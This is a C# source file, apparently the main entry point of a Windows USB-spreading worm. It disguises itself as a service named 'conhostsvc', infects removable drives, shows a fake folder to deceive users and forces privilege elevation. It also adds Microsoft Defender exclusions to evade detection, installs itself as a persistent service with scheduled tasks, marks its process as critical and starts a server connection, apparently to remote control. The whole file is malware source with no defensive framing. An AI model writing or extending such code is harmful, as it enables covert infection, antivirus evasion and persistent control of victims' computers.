using System;
using System.IO;
using System.ServiceProcess;
using System.Threading;
using System.Threading.Tasks;

namespace zort
{
    class Program : ServiceBase
    {
        public const string SERVICE_NAME = "conhostsvc";

        ServerCon conn = new ServerCon();
        Thread infectorThread = new Thread(() =>
        {
            RemovableInfector infector = new RemovableInfector();
            infector.Start();
        });

        public Program()
        {
            ServiceName = SERVICE_NAME;
        }

        public enum ExecutionState
        {
            Usb,
            Pookie,
            Service,
            Unknown
        }

        static async Task Main(string[] args)
        {
            Program program = new Program();
            if (Environment.UserInteractive)
            {
                // Run as console application
                program.OnStart(args);
                await Task.Delay(Timeout.Infinite);
            }
            else
            {
                // Run as Windows Service
                Run(program);
            }
        }

        private static ExecutionState GetExecutionState()
        {
            if (RemovableInfector.IsRunningFromInfectedUsb()) return ExecutionState.Usb;
            if (PookieHelper.AmIPookie()) return ExecutionState.Pookie;
            if (ServiceHelper.AmIService()) return ExecutionState.Service;
            return ExecutionState.Unknown;
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                var executionState = GetExecutionState();
                File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "POOKservice-log.txt"), $"State: {executionState}\n");
                Console.WriteLine($"Execution state: {executionState}");
                switch (executionState)
                {
                    case ExecutionState.Usb:
                        UsbRoutine();
                        break;
                    case ExecutionState.Pookie:
                        PookieRoutine();
                        break;
                    case ExecutionState.Service:
                        //create file in desktop
                        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                        string filePath = Path.Combine(desktopPath, "test.txt");
                        File.WriteAllText(filePath, "Hello from the service!");
                        ServiceRoutine();
                        break;
                    case ExecutionState.Unknown:
                        UnknownRoutine();
                        break;
                }
            }
            catch (Exception ex)
            {
                File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "POOKservice-log.txt"), $"Error: {ex}\n");
                throw;
            }
        }

        protected override void OnStop()
        {
            var executionState = GetExecutionState();
            if (executionState == ExecutionState.Service)
            {
                conn.Stop();
                infectorThread.Abort();
            }
            else if (executionState == ExecutionState.Pookie)
            {
                PookieHelper.PookieMutex.Release();
            }
        }

        private void UsbRoutine()
        {
            RemovableInfector.OpenFakeFolderIfRunningFromInfectedUsb();
            if (PookieHelper.PookieExists())
            {
                if (!PookieHelper.IsPookieRunning())
                {
                    File.Delete(PookieHelper.GetPookiePath());
                }
                else
                {
                    Exit();
                    return;
                }
            }
            PookieHelper.CreatePookie();
            string pookiePath = PookieHelper.GetPookiePath();
            ElevationHelper.ForceElevate(pookiePath);
            Exit();
        }

        private void PookieRoutine()
        {
            if (PookieHelper.PookieMutex.Exists()) //also creates the mutex
            {
                Exit();
            }

            if (ElevationHelper.IsElevated())
            {
                AntiDetection.AddDefenderExclusions();
                if (ServiceHelper.IsServiceInstalled())
                {
                    if (!ServiceHelper.IsServiceRunning()) ServiceHelper.StartService();
                    PookieHelper.PookieMutex.Release();
                    Exit();
                    return;
                }

                string clonePath = ServiceHelper.CreateServiceExecutable();
                ServiceHelper.InstallService(clonePath);
                PookieHelper.PookieMutex.Release();

                if (PookieHelper.Tasks.StartAtLogon.Exists()) PookieHelper.Tasks.StartAtLogon.Remove();
                if (PookieHelper.Tasks.DeleteAtNextLogon.Exists()) PookieHelper.Tasks.DeleteAtNextLogon.Remove();
                PookieHelper.Tasks.DeleteAtNextLogon.Create();
                Util.RestartComputer();
                Exit();
                return;
            }
            else
            {
                string pookiePath = PookieHelper.GetPookiePath(); //also my path!!
                ElevationHelper.ForceElevate(pookiePath);
                PookieHelper.PookieMutex.Release();
                Exit();
                return;
            }
        }

        private void ServiceRoutine()
        {
            NativeMethods.MakeProcessCritical();
            conn.Start();
            infectorThread.Start();
        }

        private void UnknownRoutine()
        {
            // Continue action as usb
            UsbRoutine();
        }

        private void Exit()
        {
            Environment.Exit(0);
        }
    }
}
